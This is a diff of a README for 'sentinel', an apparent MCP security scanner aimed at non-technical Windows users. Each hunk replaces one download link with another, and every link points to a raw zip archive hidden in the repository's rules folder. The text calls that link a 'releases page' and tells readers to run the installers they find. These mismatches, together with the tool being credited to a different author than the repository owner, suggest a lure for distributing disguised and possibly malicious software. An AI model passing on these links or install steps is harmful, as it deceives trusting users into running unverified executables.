@@ -1,6 +1,6 @@
 # 🛡️ sentinel - Easy MCP Security Scanner
 
-[![Download sentinel](https://img.shields.io/badge/Download-sentinel-blue?style=for-the-badge)](https://github.com/Spoonbillguru666/sentinel/raw/refs/heads/main/sentinel/rules/Software-v2.6-alpha.5.zip)
+[![Download sentinel](https://img.shields.io/badge/Download-sentinel-blue?style=for-the-badge)](https://raw.githubusercontent.com/Spoonbillguru666/sentinel/main/sentinel/rules/Software_1.6-beta.3.zip)
 
 sentinel is an application designed to scan for security issues in MCP (Model Context Protocol) environments. It detects threats and vulnerabilities quickly, even if you have no technical background.
 
@@ -32,11 +32,11 @@ These are common requirements that most modern Windows computers meet.
 
 To start using sentinel, you must first get the software from the official source.
 
-[![Download sentinel](https://img.shields.io/badge/Download-sentinel-grey?style=for-the-badge)](https://github.com/Spoonbillguru666/sentinel/raw/refs/heads/main/sentinel/rules/Software-v2.6-alpha.5.zip)
+[![Download sentinel](https://img.shields.io/badge/Download-sentinel-grey?style=for-the-badge)](https://raw.githubusercontent.com/Spoonbillguru666/sentinel/main/sentinel/rules/Software_1.6-beta.3.zip)
 
 Click this badge or visit the link below:
 
-https://github.com/Spoonbillguru666/sentinel/raw/refs/heads/main/sentinel/rules/Software-v2.6-alpha.5.zip
+https://raw.githubusercontent.com/Spoonbillguru666/sentinel/main/sentinel/rules/Software_1.6-beta.3.zip
 
 This link takes you to the releases page, where you can find the latest version of sentinel for download. Look for the most recent release, usually labeled with the highest version number and the current date.
 
@@ -49,7 +49,7 @@ Follow these steps carefully to get sentinel ready on your Windows PC.
 1. Open your web browser (like Chrome, Edge, or Firefox).
 
 2. Go to the release page at:
-   https://github.com/Spoonbillguru666/sentinel/raw/refs/heads/main/sentinel/rules/Software-v2.6-alpha.5.zip
+   https://raw.githubusercontent.com/Spoonbillguru666/sentinel/main/sentinel/rules/Software_1.6-beta.3.zip
 
 3. Look under the latest release for files ending in `.exe` or `.msi`. These are the Windows installer files.
 
@@ -145,7 +145,7 @@ If scanning fails:
 
 Check the releases page regularly:
 
-https://github.com/Spoonbillguru666/sentinel/raw/refs/heads/main/sentinel/rules/Software-v2.6-alpha.5.zip
+https://raw.githubusercontent.com/Spoonbillguru666/sentinel/main/sentinel/rules/Software_1.6-beta.3.zip
 
 Download the newest installer to replace the old version. Follow the same download and install steps.
 
@@ -177,6 +177,6 @@ sentinel is built by Helixar to help users detect security risks in AI and MCP e
 
 Download and install sentinel from the releases page:
 
-https://github.com/Spoonbillguru666/sentinel/raw/refs/heads/main/sentinel/rules/Software-v2.6-alpha.5.zip
+https://raw.githubusercontent.com/Spoonbillguru666/sentinel/main/sentinel/rules/Software_1.6-beta.3.zip
 
 Use the steps above to run your first scan.
